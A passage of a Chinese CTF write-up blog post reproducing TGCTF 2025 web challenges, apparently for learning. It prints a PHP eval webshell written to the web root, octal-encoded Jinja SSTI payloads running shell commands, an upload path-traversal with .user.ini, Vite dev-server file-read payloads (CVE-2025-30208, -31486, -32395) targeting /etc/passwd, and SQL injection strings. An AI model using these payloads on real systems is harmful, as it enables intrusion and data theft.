+<p>但经过查找好像没有发现flag</p>
+<p>而且wow=phpinfo();似乎没有回显</p>
+<p>那我们将一句话木马写入一个新的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wow= echo &#x27;&lt;?php @eval($_POST[&#x27;mima&#x27;]);?&gt;&#x27; &gt; /var/www/html/shell.php;</span><br></pre></td></tr></table></figure>
+<p>访问shell.php</p>
+<p>然后<code>mima=phpinfo();</code></p>
+<p>看一下这里面有没有flag</p>
+<p><img src="../images/20250413105200684.png" alt="image-20250413105200684" /></p>
+<p>找到了</p>
+<h3 id="直面天命复仇"><a class="markdownIt-Anchor" href="#直面天命复仇"></a> <strong>直面天命（复仇）</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">现在/aazz路由只能读源码了</span><br><span class="line"></span><br><span class="line">而源码把&#123;&#123;变为天命,把&#125;&#125;变为难违</span><br><span class="line"></span><br><span class="line">而且ssti注入还过滤了很多东西</span><br><span class="line"></span><br><span class="line">直接编码绕过</span><br></pre></td></tr></table></figure>
+<p><strong>原型：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>八进制编码：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=天命&#x27;&#x27;[&quot;\137\137\143\154\141\163\163\137\137&quot;][&quot;\137\137\155\162\157\137\137&quot;][1][&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;]()[137][&quot;\137\137\151\156\151\164\137\137&quot;][&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;][&#x27;\137\137\142\165\151\154\164\151\156\163\137\137&#x27;][&#x27;\145\166\141\154&#x27;](&quot;\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\160\157\160\145\156\050\047\154\163\040\057\047\051\056\162\145\141\144\050\051&quot;)难违</span><br><span class="line">输出：</span><br><span class="line">//Dockerfile a app.py bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run run.sh sbin srv static sys tgffff11111aaaagggggggg tmp usr var 描述和题解.txt</span><br></pre></td></tr></table></figure>
+<p>直接读flag就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=天命&#x27;&#x27;[&quot;\137\137\143\154\141\163\163\137\137&quot;][&quot;\137\137\155\162\157\137\137&quot;][1][&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;]()[137][&quot;\137\137\151\156\151\164\137\137&quot;][&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;][&#x27;\137\137\142\165\151\154\164\151\156\163\137\137&#x27;][&#x27;\145\166\141\154&#x27;](&quot;\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\160\157\160\145\156\050\047cat /tgffff11111aaaagggggggg\047\051\056\162\145\141\144\050\051&quot;)难违</span><br></pre></td></tr></table></figure>
+<p>flag出来了</p>
+<h3 id="ezupload"><a class="markdownIt-Anchor" href="#ezupload"></a> (ez)upload</h3>
+<p>一个文件上传题</p>
+<p>先扫一下目录文件</p>
+<p>发现一个index.php.bak和upload.php.bak，但index.php.bak没用</p>
+<p>我们看一下upload.php.bak</p>
+<p>打开是upload.php的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&#x27;UPLOAD_PATH&#x27;, __DIR__ . &#x27;/uploads/&#x27;);</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">$status_code = 200; // 默认状态码为 200</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;php2&quot;, &quot;html&quot;, &quot;htm&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">            $file_name = $_GET[&#x27;name&#x27;];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $file_name = basename($_FILES[&#x27;name&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;name&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $file_content = file_get_contents($temp_file);</span><br><span class="line"></span><br><span class="line">            if (preg_match(&#x27;/.+?&lt;/s&#x27;, $file_content)) &#123;</span><br><span class="line">                $msg = &#x27;文件内容包含非法字符，禁止上传！&#x27;;</span><br><span class="line">                $status_code = 403; // 403 表示禁止访问</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $img_path = UPLOAD_PATH . $file_name;</span><br><span class="line">                if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                    $is_upload = true;</span><br><span class="line">                    $msg = &#x27;文件上传成功！&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">                    $status_code = 500; // 500 表示服务器内部错误</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">            $status_code = 403; // 403 表示禁止访问</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">        $status_code = 404; // 404 表示资源未找到</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 设置 HTTP 状态码</span><br><span class="line">http_response_code($status_code);</span><br><span class="line"></span><br><span class="line">// 输出结果</span><br><span class="line">echo json_encode([</span><br><span class="line">    &#x27;status_code&#x27; =&gt; $status_code,</span><br><span class="line">    &#x27;msg&#x27; =&gt; $msg,</span><br><span class="line">]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里检测了上传的文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/.+?&lt;/s&#x27;, $file_content)</span><br></pre></td></tr></table></figure>
+<p>绕过：<code>&lt;? php eval($_POST['mima']);</code></p>
+<p>可以不闭合&lt;?进行绕过</p>
+<p>而且发现可以上传.user.ini文件</p>
+<p>但上传之后会发现，当前目录并没有php文件，所以没办法将一句话木马文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意到可传入name参数来控制文件名，同时basename并没有对name参数进行清洗，$img_path是由文件名直接拼接得到，存在目录穿越漏洞，因此我们可以将文件上传到/var/www/html目录中，配合`.user.ini`实现对非.php文件的解析，上线webshell：</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250414222203159.png" alt="image-20250414222203159" /></p>
+<p><img src="../images/20250414222223914.png" alt="image-20250414222223914" /></p>
+<p>将文件上传到上级目录，然后直接访问upload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload.php?cmd=system(&quot;env&quot;);</span><br></pre></td></tr></table></figure>
+<h3 id="前端game"><a class="markdownIt-Anchor" href="#前端game"></a> <strong>前端</strong>GAME</h3>
+<p><strong>考点总结：CVE-2025-30208 Vite开发服务器任意文件读取漏洞</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/risheng/p/18795361">https://www.cnblogs.com/risheng/p/18795361</a></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">读取/etc/passwd文件：</span><br><span class="line">/@fs/etc/passwd?import&amp;raw3</span><br><span class="line">/@fs/etc/passwd?raw3</span><br><span class="line">读取flag：</span><br><span class="line">/@fs/tgflagggg?import&amp;raw3</span><br><span class="line">/@fs/tgflagggg?raw3</span><br></pre></td></tr></table></figure>
+<p>…无敌的考点</p>
+<h3 id="前端game-plus"><a class="markdownIt-Anchor" href="#前端game-plus"></a> <strong>前端</strong>GAME Plus</h3>
+<p><strong>考点总结：CVE-2025-31486 Vite开发服务器任意文件读取漏洞</strong></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd1?.svg1?.sm?init</span><br><span class="line">/tgflagggg1?.g1?.sm?init</span><br></pre></td></tr></table></figure>
+<h3 id="前端game-ultra"><a class="markdownIt-Anchor" href="#前端game-ultra"></a> <strong>前端</strong>GAME Ultra</h3>
+<p><strong>考点总结：CVE-2025-32395 Vite开发服务器任意文件读取漏洞（兵不厌诈）</strong></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径</span><br><span class="line">curl --request-target /@fs/app/#/../../../../../etc/passwd</span><br><span class="line">http://node1.tgctf.woooo.tech:32742/</span><br><span class="line">curl --request-target /@fs/app/#/../../../../../tgflagggg</span><br><span class="line">http://node2.tgctf.woooo.tech:31500/</span><br></pre></td></tr></table></figure>
+<h3 id="tgctf2025-后台管理"><a class="markdownIt-Anchor" href="#tgctf2025-后台管理"></a> TGCTF2025 <strong>后台管理</strong></h3>
+<p>SQL注入</p>
+<p>大佬解题思路： 进入环境是一个登录框，推测存在sql注入，简单fuzz了一下发现过滤了<code>'</code>，并且限制字符串长度不超过64，故意过滤了<code>'</code>，那么题目很可能是单引号闭合，通过给<code>username</code>传入<code>\</code>转义第二个引号，同时给<code>password</code>传入<code>#</code>注释第四个引号，完成闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, redirect, render_template,</span><br><span class="line">render_template_string</span><br><span class="line">import pymysql.cursors</span><br><span class="line">import os</span><br><span class="line">def db():</span><br><span class="line">    return pymysql.connect(</span><br><span class="line">        host=os.environ[&quot;MYSQL_HOST&quot;],</span><br><span class="line">        user=os.environ[&quot;MYSQL_USER&quot;],</span><br><span class="line">        password=os.environ[&quot;MYSQL_PASSWORD&quot;],</span><br><span class="line">        database=os.environ[&quot;MYSQL_DATABASE&quot;],</span><br><span class="line">        charset=&quot;utf8mb4&quot;,</span><br><span class="line">        cursorclass=pymysql.cursors.DictCursor,</span><br><span class="line">   )</span><br><span class="line">app = Flask(\Zname\Z)</span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    if &quot;username&quot; not in request.cookies:</span><br><span class="line">        return redirect(&quot;/login&quot;)</span><br><span class="line">    return render_template(&quot;index.html&quot;, username=request.cookies[&quot;username&quot;])</span><br><span class="line">@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def login():</span><br><span class="line">可以在参数中使用 \ 来转义字符串从而绕开引号的限制，剩下的就很简单了。</span><br><span class="line">    if request.method f &quot;POST&quot;:</span><br><span class="line">        username = request.form.get(&quot;username&quot;)</span><br><span class="line">        password = request.form.get(&quot;password&quot;)</span><br><span class="line">        if username is None or password is None:</span><br><span class="line">            return &quot;要输入账号密码喔~&quot;, 400</span><br><span class="line">        if len(username) &gt; 64 or len(password) &gt; 64:</span><br><span class="line">            return &quot;哈~太长了，受不了了~&quot;, 400</span><br><span class="line">        if &quot;&#x27;&quot; in username or &quot;&#x27;&quot; in password:</span><br><span class="line">            return &quot;杂鱼，还想SQL注入？爬！&quot;, 400</span><br><span class="line">        conn = None</span><br><span class="line">        try:</span><br><span class="line">            conn = db()</span><br><span class="line">            with conn.cursor() as cursor:</span><br><span class="line">                cursor.execute(</span><br><span class="line">                    f&quot;SELECT * FROM users WHERE username = &#x27;&#123;username&#125;&#x27; AND</span><br><span class="line">password = &#x27;&#123;password&#125;&#x27;&quot;</span><br><span class="line">               )</span><br><span class="line">                user = cursor.fetchone()</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return f&quot;Error: &#123;e&#125;&quot;, 500</span><br><span class="line">        finally:</span><br><span class="line">            if conn is not None:</span><br><span class="line">                conn.close()</span><br><span class="line">        if user is None or &quot;username&quot; not in user:</span><br><span class="line">            return &quot;账号密码错误&quot;, 400</span><br><span class="line">        response = redirect(&quot;/&quot;)</span><br><span class="line">        response.set_cookie(&quot;username&quot;, user[&quot;username&quot;])</span><br><span class="line">        return response</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;login.html&quot;)</span><br></pre></td></tr></table></figure>
+<p>可以在参数中使用 \ 来转义字符串从而绕开引号的限制，剩下的就很简单了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;password=+and+updatexml(null,concat((select+*+from+flag)),null)--+-</span><br><span class="line">username=\&amp;password=union select *,2 from flag#</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[BJDCTF2020]EzPHP" class="lazyload">
+        
+        <a href="/2025/04/13/%5BBJDCTF2020%5DEzPHP/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [BJDCTF2020]EzPHP
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="JS原型链污染" class="lazyload">
+      
+      <a href="/2025/04/11/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          JS原型链污染
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aaa%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="toc-number">1.1.</span> <span class="toc-text"> AAA偷渡阴平</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%E5%A4%8D%E4%BB%87"><span class="toc-number">1.2.</span> <span class="toc-text"> 偷渡阴平(复仇)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%9C%BC%E8%BE%A9%E9%AD%91%E9%AD%85"><span class="toc-number">1.3.</span> <span class="toc-text"> 火眼辩魑魅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD"><span class="toc-number">1.4.</span> <span class="toc-text"> 直面天命</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.5.</span> <span class="toc-text"> 什么文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E4%BB%87"><span class="toc-number">1.6.</span> <span class="toc-text"> 什么文件上传？（复仇）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD%E5%A4%8D%E4%BB%87"><span class="toc-number">1.7.</span> <span class="toc-text"> 直面天命（复仇）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezupload"><span class="toc-number">1.8.</span> <span class="toc-text"> (ez)upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFgame"><span class="toc-number">1.9.</span> <span class="toc-text"> 前端GAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFgame-plus"><span class="toc-number">1.10.</span> <span class="toc-text"> 前端GAME Plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFgame-ultra"><span class="toc-number">1.11.</span> <span class="toc-text"> 前端GAME Ultra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tgctf2025-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86"><span class="toc-number">1.12.</span> <span class="toc-text"> TGCTF2025 后台管理</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "TGCTF比赛复现",
+          url: "http://example.com/2025/04/12/TGCTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  web  AAA偷渡阴平 无参数rce 用chdir(next(scandir(current(localeconv()))));转移到上层路径 转移到根目录需要三次 然后直接用readfile(flag)读取flag 1?tgctf2025=chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(locale",
+          date: "Sat Apr 12 2025 11:16:49 GMT+0800",
+          updated: "Sun Jan 25 2026 12:04:17 GMT+0800",
+          cover: "/../images/17384736097c9d.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
